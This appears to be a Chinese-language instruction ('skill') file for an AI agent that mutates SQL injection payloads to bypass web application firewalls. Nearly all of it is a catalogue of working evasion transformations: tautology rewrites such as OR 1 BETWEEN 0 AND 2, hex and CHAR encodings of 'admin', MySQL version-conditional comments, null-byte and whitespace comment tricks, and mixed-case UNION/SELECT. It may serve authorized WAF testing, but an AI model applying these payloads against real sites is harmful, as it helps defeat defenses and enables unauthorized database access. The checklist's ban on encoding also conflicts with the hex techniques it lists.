# SQL 注入语义变异 Skill

## 核心任务

基于漏洞语义理解的结果，提出具体的 SQL 注入 `part_operations`，通过改变 SQL 注入 Payload 的语法表达方式来绕过 WAF，同时保持原始验证目标。

## 变异策略层次

变异从浅到深分为 4 个层次，**优先使用深层策略**：

### L1：同义替换（最浅——仅改变表面表达）
```
OR 1=1 → OR 1 BETWEEN 0 AND 2             （谓词等价变换）
```

### L2：结构重组（中等——改变 Payload 的语法组织）
```
OR 1=1 -- → OR (1)=(1)#                    （括号+注释符组合变化）
```

### L3：间接引用与控制流（深层——引入中间层）
```
SELECT ... WHERE id=1 → SELECT ... WHERE id=(SELECT 1)  （子查询包装）
```

### L4：数据库特性利用（最深——利用数据库特异性）
```
1=1 → 1e0=1e0                              （科学计数法）
'admin' → 0x61646D696E                     （十六进制编码）
SELECT → /*!50000SELECT*/                  （版本条件注释）
```

## SQL 注入变异技术目录

### 技术 1：谓词重写
- **原理**：将逻辑谓词改写为等价形式
- **适用部件**：`predicate`
- **变换表**：
  ```
  OR 1=1    → OR 1 BETWEEN 0 AND 2
  OR 1=1    → OR 1 IN (1)
  OR 1=1    → OR 'a' LIKE 'a'
  OR 1=1    → OR NOT(1<>1)
  OR 1=1    → OR CASE WHEN 1 THEN 1 END
  OR 1=1    → OR 1<=>1          （NULL 安全等于）
  OR 1=1    → OR 'a'='a'
  OR 1=1    → OR 1&1
  ```

### 技术 2：运算符切换
- **原理**：替换逻辑运算符为等价符号
- **适用部件**：`operator`
- **变换表**：
  ```
  OR → ||, |   (MySQL: || 是 OR；需 PIPES_AS_CONCAT=OFF)
  AND → &&, &
  NOT → !
  XOR → ^
  ```

### 技术 3：比较值重写
- **原理**：改变字符串或数值的表示方式
- **适用部件**：`comparison_value`
- **变换表**：
  ```
  'admin' → CHAR(97,100,109,105,110)
  'admin' → CONCAT('ad','min')
  'admin' → 0x61646D696E
  'admin' → UNHEX('61646D696E')
  'admin' → REVERSE('nimda')   （需要额外 REVERSE 调用）
  ```

### 技术 4：子查询包装
- **原理**：将简单查询包装在子查询中
- **适用部件**：`subquery`
- **示例**：
  ```
  SELECT ... WHERE id=1
  → SELECT ... WHERE id=(SELECT 1)
  → SELECT ... WHERE id=(SELECT id FROM users LIMIT 1)
  → SELECT ... WHERE 1=(SELECT 1 FROM DUAL)
  ```

### 技术 5：注释混淆
- **原理**：使用不同的注释语法混淆 WAF 检测
- **适用部件**：`comment_terminator`
- **变换表**：
  ```
  -- (单行，需要后跟空格)
  → --%20, --\t, --\n
  → # (MySQL 单行)
  → ;%00 (PHP nullbyte 终止)
  → /*...*/ 内联注释
  → /*!50000...*/ 版本条件注释（MySQL）
  ```

### 技术 6：科学计数法与替代数字表示
- **原理**：使用科学计数法或其他数字表示形式
- **适用部件**：`comparison_value`
- **示例**：
  ```sql
  1=1 → 1e0=1e0 → 1.=1. → 0x1=0x1 → b'1'=b'1'
  ```

### 技术 7：类型转换函数
- **原理**：使用 CAST/CONVERT 函数包装值
- **适用部件**：`comparison_value`
- **示例**：
  ```sql
  'admin' → CAST('admin' AS CHAR)
  'admin' → CONVERT('admin', CHAR)
  1 → CAST(1 AS UNSIGNED) → CAST(0x31 AS CHAR)
  ```

### 技术 8：NULL 安全比较与位运算
- **原理**：使用 NULL 安全运算符或位运算
- **适用部件**：`operator`, `predicate`
- **示例**：
  ```sql
  1=1 → 1<=>1 → 1&1 → 1|0 → ~0<>0
  OR 1=1 → OR !!1 → OR !0 → OR 1^0
  ```

### 技术 9：函数名大小写与空白混淆
- **原理**：混合大小写或插入注释/空白
- **适用部件**：`whitespace_structure`
- **示例**：
  ```sql
  SELECT → SeLeCt → select → sElEcT
  UNION → /*!50000UNION*/ → UNI%0aON → UNI%09ON
  ```

### 技术 10：括号与操作符优先级
- **原理**：使用括号改变表达式结构
- **适用部件**：`predicate`
- **示例**：
  ```sql
  1=1 → (1)=(1) → ((1))=((1)) → (1)IN(1) → (1)LIKE(1)
  OR 1=1 → OR(1)=(1) → OR(1)IN(1,2,3)
  ```

## 变异原则检查清单

每轮提出操作前，确认：
- [ ] 每个操作的目标部件存在且类型正确
- [ ] 不删除 required=true 的部件
- [ ] 至少有一个实质性的语义变化
- [ ] 没有使用编码/解码/转义
- [ ] 保持了原始验证目标（如 OR 1=1 的恒真性）
- [ ] 没有引入破坏性 SQL 操作（DROP、DELETE、UPDATE）
- [ ] 优先选择 `available_directions` 中未使用的方向
